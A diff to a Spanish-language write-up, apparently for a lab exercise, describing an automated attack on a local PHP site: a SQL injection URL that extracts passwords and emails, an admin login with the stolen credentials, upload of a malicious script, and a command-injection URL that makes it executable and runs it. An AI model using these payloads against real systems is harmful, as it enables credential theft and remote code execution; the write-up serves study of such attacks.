@@ -40,13 +40,16 @@ El sistema está configurado para que se ejecute automáticamente en el arranque
 #### Paso 2: Explotación de la vulnerabilidad (RCE)
 
 1. **Explotación de Inyección SQL**:
+2. 
    En el script `automatizado.sh`, se realiza una solicitud HTTP con una inyección SQL en el parámetro `rover_id`:
    ```bash
    fetch_url="http://localhost/web/final/ulio-html/listadoFotosRovers.php?rover_id=%27e%27%20UNION%20SELECT%20fa.contrasena,%20fa.gmail,%201,%202,%203%20FROM%20final_usuarios%20fa,%20final_administradores%20f%20WHERE%20f.usuario_id%20=%20fa.id"
    ```
    La inyección SQL utiliza `UNION SELECT` para combinar las tablas `final_usuarios` y `final_administradores` y extraer las contraseñas (`fa.contrasena`) y los correos electrónicos (`fa.gmail`) de los usuarios. Esta información se extrae utilizando `jq` para manejar la respuesta JSON y extraer los valores de las credenciales.
 
-2. **Login de administrador**:
+   En este escenario, la necesidad de obtener las credenciales de administrador se debe a que, aunque el sistema permite que los usuarios normales se registren y accedan a la página, solo los administradores tienen privilegios especiales, como la capacidad de subir archivos.
+
+4. **Login de administrador**:
    Los datos obtenidos de la inyección se usan para realizar un login automático con `curl`, enviando las credenciales extraídas del ataque:
    ```bash
    curl -X POST \
@@ -58,14 +61,14 @@ El sistema está configurado para que se ejecute automáticamente en el arranque
    ```
    Esto permite al atacante obtener acceso como administrador en la web.
 
-3. **Subida de archivo malicioso**:
+5. **Subida de archivo malicioso**:
    Una vez autenticado, el atacante sube un archivo malicioso (`gdb.sh`) al servidor mediante una solicitud POST:
    ```bash
    curl -X POST -F "profile_picture=@gdb.sh" http://localhost/web/final/dashmin/upload.php
    ```
    Este archivo contiene un script que intentará ejecutar comandos en el servidor, probablemente con la intención de obtener una shell.
 
-4. **Ejecución de comando**:
+6. **Ejecución de comando**:
    El script luego realiza una llamada a la URL que ejecuta comandos en el servidor (`files_url_root`) para ejecutar el archivo malicioso subido. El comando intenta cambiar permisos del archivo `gdb.sh` para hacerlo ejecutable y luego lo ejecuta:
    ```bash
    files_url_root="http://localhost/web/final/dashmin/list_uploads.php?comando=ls%20uploads%3B%20cd%20uploads;chmod%20744%20gdb.sh;./gdb.sh"
